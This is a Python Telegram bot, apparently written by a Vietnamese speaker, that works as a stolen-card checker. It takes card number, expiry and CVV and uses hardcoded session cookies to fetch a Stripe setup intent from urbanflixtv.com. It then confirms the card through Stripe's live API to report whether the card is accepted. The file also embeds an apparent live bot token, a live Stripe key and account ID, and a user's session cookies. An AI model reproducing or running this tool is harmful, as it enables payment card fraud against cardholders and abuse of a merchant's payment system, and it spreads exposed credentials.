import requests, re
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from bs4 import BeautifulSoup

# === CONFIG ===
TELEGRAM_TOKEN = "7482122603:AAG-d2VwSvySZhKfNYpjz9HXnlduvgETYQ4"
ALLOWED_USER_ID = 5127429005  # Thay bằng Telegram user_id của bạn

COOKIES = "referer=; country_code=VN; ip_address=113.172.83.44; agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F137.0.0.0+Safari%2F537.36; started_at=2025-07-04+13%3A18%3A34+%2B0400; initialized=true; pixel_session=42fa4f62-24ee-4290-b944-29a1c4b6a040; __stripe_mid=c4954d5a-d300-446d-8144-a7c65563cbac3f9142; __stripe_sid=6147f14c-a06f-420c-a782-594d676d8a2a332b9d; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3lOakV6T1RreE1GMHNJaVF5WVNReE1DUnNNVXhGUm01SFIxRktjVTFKVldRelpIaFViWEoxSWl3aU1UYzFNVFl5TURnNU5pNHhPVGd3TmpZM0lsMD0iLCJleHAiOiIyMDI1LTA3LTE4VDA5OjIxOjM2LjE5OFoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--8527b8dbcf83519531f0efb3138277bed6dca942; user_referrer=https%3A%2F%2Furbanflixtv.com%2Faccount%2Fpurchases; _uscreen2_session=Wuaaj7drKz9cEXYzN8JSMk0CyIVGH%2F5LobLcSzp2j5KpnpWRbQyfWaB9TjyiAvv625X0S9O%2BqY5gR8apPLMoTR1VJ5DCsKr6wQVREGRZDluhZDYdduMptP%2FI37guWMtI%2BfXKIAOieSuwort4XeQaZCJHecqesYujxG2vCkT62oyYFpVBKK9QTcn37B7pH5mVOCAjPzKQeZhz8zg7m9uM6SkuFbs3qTu1oVpqTDiwNj896tqiY4Do2N2PgLH9zl%2FAhABhKFpkhup3XV850HgPONukbRcge%2BqIB9xpwUPL1CfVofj2QQaQuQwjBLc55Fo2LA4ah9CUh17aJ4vAZ0tP%2B4OHlBFyoeY%2BFdIxtn8VihCWwizY%2F%2B57IB3eahWEkGGnjhcNDws382eKoiWpjIeT60ya0SjDL2SFDTw60CBs%2BiQGjaJ0WtmdiyU%3D--%2FMF2m6h5yj3XpgiU--7WSv5xuZvzz5%2FzO0g7tDLg%3D%3D"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "cookie": COOKIES
}

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ALLOWED_USER_ID:
        await update.message.reply_text("❌ Không có quyền sử dụng bot này.")
        return

    if not context.args:
        await update.message.reply_text("❌ Dùng: /chk cc|mes|ano|cvv")
        return

    raw = context.args[0]
    match = re.match(r'^(\d{12,19})\|(\d{1,2})\|(\d{4})\|(\d{3,4})$', raw)

    if not match:
        await update.message.reply_text("❌ Sai cú pháp.")
        return

    cc, mes, ano, cvv = match.groups()
    await update.message.reply_text("🕐 Đang kiểm tra...")

    try:
        # Bước 1: Lấy CSRF token
        r1 = requests.get("https://urbanflixtv.com/account/purchases/payment_methods", headers=HEADERS)
        soup = BeautifulSoup(r1.text, "html.parser")
        token = soup.find("meta", {"name": "csrf-token"})["content"]

        # Bước 2: Lấy setup_intent
        r2 = requests.get("https://urbanflixtv.com/api/billings/setup_intent?page=payment_methods&currency=usd", headers=HEADERS)
        json2 = r2.json()
        setid = json2["setup_intent"]
        setin = setid.split("_secret_")[0]

        # Bước 3: Xác nhận
        payload = {
            "return_url": "https://urbanflixtv.com/account/purchases/payment_methods/async_method_setup",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_year]": ano,
            "payment_method_data[card][exp_month]": mes,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][country]": "VN",
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": "stripe.js/155bc2c263; stripe-js-v3/155bc2c263; payment-element",
            "payment_method_data[referrer]": "https://urbanflixtv.com",
            "payment_method_data[time_on_page]": "20923",
            "payment_method_data[client_attribution_metadata][client_session_id]": "487a05d5-8c48-488f-a3ab-e8de179fc4ef",
            "payment_method_data[guid]": "40a664fd-df2e-4b44-92e3-0476c602e58a96f58e",
            "payment_method_data[muid]": "c4954d5a-d300-446d-8144-a7c65563cbac3f9142",
            "payment_method_data[sid]": "6147f14c-a06f-420c-a782-594d676d8a2a332b9d",
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_DImPqz7QOOyx70XCA9DSifxb",
            "_stripe_account": "acct_1Cmk2bLbC5cLZDVD",
            "client_secret": setid
        }

        r3 = requests.post(
            f"https://api.stripe.com/v1/setup_intents/{setin}/confirm",
            headers=HEADERS,
            data=payload
        )
        j3 = r3.json()
        status = j3.get("status", "UNKNOWN")
        decline = j3.get("error", {}).get("decline_code", "NONE")
        await update.message.reply_text(f"✅ STATUS: {status}\n🚫 DECLINE CODE: {decline}")

    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi xử lý: {str(e)}")

if __name__ == '__main__':
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("chk", chk))
    print("✅ Bot đang chạy...")
    app.run_polling()
